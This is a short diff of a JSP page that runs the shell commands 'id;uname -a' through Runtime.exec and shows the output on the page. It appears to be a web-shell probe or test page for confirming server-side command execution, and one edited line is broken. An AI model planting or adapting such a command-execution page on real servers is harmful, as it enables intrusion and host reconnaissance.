@@ -4,7 +4,7 @@
 <%
 
 String result = "";
-Process p = Runtime.getRuntime().exec("id");
+Process p = Runtime.getRuntime().exec("id;uname -a");
 OutputStream os = p.getOutputStream();
 InputStream in = p.getInputStream();
 DataInputStream dis = new DataInputStream(in);
@@ -14,5 +14,5 @@ pageContext.setAttribute("result", res);
 
 %>
 
-T10:
+Process p = Runtime.getRuntime().exec("id;uname -a"):
 <c:out value="${result}"/>
